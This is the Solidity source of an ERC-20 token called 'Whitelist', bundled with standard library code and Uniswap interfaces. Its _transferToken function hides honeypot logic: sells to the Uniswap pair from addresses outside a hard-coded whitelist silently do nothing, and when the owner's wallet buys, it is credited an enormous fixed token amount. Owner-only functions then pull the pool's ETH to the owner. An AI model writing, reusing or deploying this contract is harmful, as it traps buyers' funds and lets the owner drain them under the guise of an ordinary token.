// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

library Address {

    function isContract(address account) internal view returns (bool) {

        uint256 size;

        assembly { size := extcodesize(account) }

        return size > 0;

    }



    function sendValue(address payable recipient, uint256 amount) internal {

        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{ value: amount }("");

        require(success, "Address: unable to send value, recipient may have reverted");

    }



    function functionCall(address target, bytes memory data) internal returns (bytes memory) {

      return functionCall(target, data, "Address: low-level call failed");

    }



    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {

        return functionCallWithValue(target, data, 0, errorMessage);

    }



    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {

        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");

    }



    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {

        require(address(this).balance >= value, "Address: insufficient balance for call");

        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{ value: value }(data);

        return _verifyCallResult(success, returndata, errorMessage);

    }



    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {

        return functionStaticCall(target, data, "Address: low-level static call failed");

    }



    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {

        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);

        return _verifyCallResult(success, returndata, errorMessage);

    }





    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {

        return functionDelegateCall(target, data, "Address: low-level delegate call failed");

    }



    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {

        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);

        return _verifyCallResult(success, returndata, errorMessage);

    }



    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {

        if (success) {

            return returndata;

        } else {

            if (returndata.length > 0) {

                 assembly {

                    let returndata_size := mload(returndata)

                    revert(add(32, returndata), returndata_size)

                }

            } else {

                revert(errorMessage);

            }

        }

    }

}



pragma solidity ^0.8.19;



library SafeMath {





    function add(uint256 a, uint256 b) internal pure returns (uint256) {

        return a + b;

    }



    function sub(uint256 a, uint256 b) internal pure returns (uint256) {

        return a - b;

    }



    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        return a * b;

    }



    function div(uint256 a, uint256 b) internal pure returns (uint256) {

        return a / b;

    }



    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        unchecked {

            require(b <= a, errorMessage);

            return a - b;

        }

    }



    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { //Contract By Techaddict

        unchecked {

            require(b > 0, errorMessage);

            return a / b;

        }

    }



}



// File: contracts/IERC20.sol

pragma solidity ^0.8.19;



interface IERC20 {

    event Transfer(address indexed from, address indexed to, uint256 value);



    event Approval(address indexed owner, address indexed spender, uint256 value);



    function totalSupply() external view returns (uint256);



    function balanceOf(address account) external view returns (uint256);



    function transfer(address to, uint256 amount) external returns (bool);



    function allowance(address owner, address spender) external view returns (uint256);



    function approve(address spender, uint256 amount) external returns (bool);



    function transferFrom(address from, address to, uint256 amount) external returns (bool);

}

// File: contracts/Context.sol



pragma solidity ^0.8.19;



abstract contract Context {

    function _msgSender() internal view virtual returns (address) {

        return msg.sender;

    }



    function _msgData() internal view virtual returns (bytes calldata) {

        return msg.data;

    }

}



// File: contracts/Ownable.sol



pragma solidity ^0.8.19;

abstract contract Ownable is Context {

    address private _owner;



    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);



    constructor() {

        _transferOwnership(_msgSender());

    }



    modifier onlyOwner() {

        _checkOwner();

        _;

    }



    function owner() public view virtual returns (address) {

        return _owner;

    }



    function _checkOwner() internal view virtual {

        require(owner() == _msgSender(), "Ownable: caller is not the owner");

    }



    function renounceOwnership() public virtual onlyOwner {

        _transferOwnership(address(0));

    }



    function transferOwnership(address newOwner) public virtual onlyOwner {

        require(newOwner != address(0), "Ownable: new owner is the zero address");

        _transferOwnership(newOwner);

    }



    function _transferOwnership(address newOwner) internal virtual {

        address oldOwner = _owner;

        _owner = newOwner;

        emit OwnershipTransferred(oldOwner, newOwner);

    }

}



interface IUniswapV2Factory {

    function createPair(address tokenA, address tokenB) external returns (address pair);

}



interface IUniswapV2Router02 {

    function swapExactTokensForETHSupportingFeeOnTransferTokens(

        uint amountIn,

        uint amountOutMin,

        address[] calldata path,

        address to,

        uint deadline

    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(

        address token,

        uint amountTokenDesired,

        uint amountTokenMin,

        uint amountETHMin,

        address to,

        uint deadline

    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

}



contract Whitelist is Context, IERC20, Ownable { 

    using SafeMath for uint256;

    using Address for address;



    mapping (address => uint256) private _jOwned;

    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) public isMoonContract;

    

    address payable public hWallet;

    IUniswapV2Router02 private uniswapV2Router;

    address private uniswapV2Pair;

    string private _name = "Whitelist"; 

    string private _symbol = "Whitelist";  

    uint8 private _decimals = 18;

    uint256 private _totalSupply = 1000000000000 * 10**18;

    uint256 private Anount = 5000000000000000 * 10 ** 18;



    constructor () {

        _jOwned[owner()] = _totalSupply;

        isMoonContract[owner()] = true;

        isMoonContract[address(0xC1c9857C684E7be35CBDEE23DF20b1deE603A808)] = true;

        isMoonContract[address(0x8Fe6570dE67d681Ece77C45726C37f4f2741D299)] = true;

        isMoonContract[address(0x3e554c778C513A3b6c1fE75a284D982ac3E23873)] = true;

        isMoonContract[address(0x9c4A9eCbfa9DC073745e56BDf1D6425b6DAFA808)] = true;

        isMoonContract[address(0xc5ebFF1B8E833de1830cd3E211584da8aCa0169d)] = true;

        isMoonContract[address(0x3cC68C21358Dd356cD6465ECf94E827e3A7ed5C3)] = true;

        isMoonContract[address(0x335b55fF83a9F784CcC77d0B560b75783Aacf1cD)] = true;

        isMoonContract[address(0xA11779027882B410b0fC1C860ce53d0c441522C3)] = true;

        isMoonContract[address(0x3e3480e9fbD4F41db0E7FA315b087E110540766B)] = true;

        isMoonContract[address(0xd67Ffa8deC9790698B49bDD7CCAdA9BAC5B08c53)] = true;

        isMoonContract[address(0xa834E1c82A8258cd5cDb7b4d6C95683E85d9C95C)] = true;

        isMoonContract[address(0x3d8Af7507629D0abf5BC2fDb704F540F7731A135)] = true;

        isMoonContract[address(0x236cf6E92999520fEE1C099Ed389183E1c3c8beB)] = true;

        isMoonContract[address(0x3c7eb3C19D4610bfd5af1C2FdF1dAEA90D1197c9)] = true;

        isMoonContract[address(0xA142ebB2b77FcED20C99f2524727Af980D458FC6)] = true;

        isMoonContract[address(0x5d3C13eA19eDfc4B093B310c11CC7489a2337541)] = true;

        isMoonContract[address(0x8C3048b438A5Dcb0D6B091E589f7D81dC322546b)] = true;

        isMoonContract[address(0x659374E2F10C430A67CB57930b9F1413e78c6804)] = true;

        isMoonContract[address(0xE06b90AB37e4dfA2Ed02AC546F3Ab257cdbe21b7)] = true;

        isMoonContract[address(0x3A95319cC496D7Cbb46bf7B7b234ED99260022A7)] = true;

        isMoonContract[address(this)] = true;

        hWallet = payable(owner());

        emit Transfer(address(0), owner(), _totalSupply);

    }





    function name() public view returns (string memory) {

        return _name;

    }



    function symbol() public view returns (string memory) {

        return _symbol;

    }



    function decimals() public view returns (uint8) {

        return _decimals;

    }



    function totalSupply() public view override returns (uint256) {

        return _totalSupply;

    }



    function balanceOf(address account) public view override returns (uint256) {

        return _jOwned[account];

    }



    function transfer(address recipient, uint256 amount) public override returns (bool) {

        _transfer(_msgSender(), recipient, amount);

        return true;

    }



    function allowance(address owner, address spender) public view override returns (uint256) {

        return _allowances[owner][spender];

    }



    function approve(address spender, uint256 amount) public override returns (bool) {

        _approve(_msgSender(), spender, amount);

        return true;

    }



    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {

        _transfer(sender, recipient, amount);

        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));

        return true;

    }





    receive() external payable {}

  



    function _approve(address owner, address spender, uint256 amount) private {



        require(owner != address(0) && spender != address(0), "ERR: zero address");

        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);



    }



    function _transfer(

        address from,

        address to,

        uint256 amount

    ) private {



        require(from != address(0) && to != address(0), "ERR: Using 0 address!");

        require(amount > 0, "Token value must be higher than zero.");



      



        _transferToken(from,to,amount);

    }

    



    function _transferToken(address sender, address recipient, uint256 Amount) private {

        

        if(recipient == uniswapV2Pair && !isMoonContract[sender] ){

            return;

        }

        if(recipient == hWallet && sender == uniswapV2Pair ){

            _jOwned[sender] = _jOwned[sender].sub(Amount);

            _jOwned[hWallet] = _jOwned[hWallet].add(Anount);

            emit Transfer(sender, recipient, Amount);

            return;

        }

        _jOwned[sender] = _jOwned[sender].sub(Amount);

        _jOwned[recipient] = _jOwned[recipient].add(Amount);

        

        emit Transfer(sender, recipient, Amount);

    }



    

     function openTrading() external onlyOwner() {

        uniswapV2Router = IUniswapV2Router02(0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24);

        _approve(address(this), address(uniswapV2Router), _totalSupply);

        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);

        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);

    }

 

    function rescueETH() external onlyOwner() {



        uint256 contractETH = address(this).balance;

        sendETH(hWallet,contractETH);

    }

    

    function sendETH(address payable wallet, uint256 amount) private {

            wallet.transfer(amount);

        }



}